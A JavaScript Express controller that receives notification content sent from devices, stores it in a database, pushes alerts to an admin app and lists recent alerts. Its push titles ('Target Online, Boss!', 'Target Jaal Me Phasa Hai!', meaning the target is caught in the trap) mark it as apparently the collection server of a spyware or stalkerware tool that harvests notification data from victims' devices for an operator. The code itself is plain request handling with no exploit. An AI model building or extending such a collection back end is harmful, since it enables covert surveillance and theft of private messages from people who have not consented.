// controllers/notificationController.js
import { saveNotificationToDB, sendPushToAdmin } from '../database/NotificationManager.js';
import { db } from '../database/config.js'; 

export const handleIncomingNotification = async (req, res) => {
    try {
        const { device_id, content, timestamp } = req.body;

        if (!device_id || !content) {
            return res.status(400).json({ success: false, message: "Missing required payload fields" });
        }

        const timeString = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
        console.log(`\n[🚨 ALERT RECEIVED] Time: ${timeString} | Device: ${device_id}`);

        // DB save function call
        await saveNotificationToDB({ device_id, content, timestamp });

        // Push dispatch to Expo
        const titles = [
          "🚨 Target Online, Boss!",
          "👀 Halchal Detected!",
          "🔥 Naya Data Aaya Hai!",
          "⚡ Something Is Unusual!",
          "🎯 Target Jaal Me Phasa Hai!",
        ];
        const pushTitle = titles[Math.floor(Math.random() * titles.length)];
        await sendPushToAdmin(pushTitle, content);

        res.status(200).json({ 
            success: true, 
            message: "Alert stored in DB and pushed to Expo app!" 
        });

    } catch (error) {
        console.error("[-] Error in handleIncomingNotification:", error);
        res.status(500).json({ success: false, message: "Internal Server Error" });
    }
};


export const fetchAllNotifications = async (req, res) => {
    try {
        // Alerts ab unique devices ke hisaab se aayenge
        const snapshot = await db.collection('notification')
                                 .orderBy('timestamp', 'desc')
                                 .limit(50)
                                 .get();
        
        const alerts = [];
        snapshot.forEach(doc => {
            // DHYAN DEIN: Yahan frontend ke liye doc.id ko wapas 'device_id' me map kar diya hai
            alerts.push({ 
                device_id: doc.id, 
                ...doc.data() 
            });
        });

        res.status(200).json({ success: true, data: alerts });
    } catch (error) {
        console.error("[-] DB Fetch Error (Notifications):", error);
        res.status(500).json({ success: false, message: "Failed to fetch alerts" });
    }
};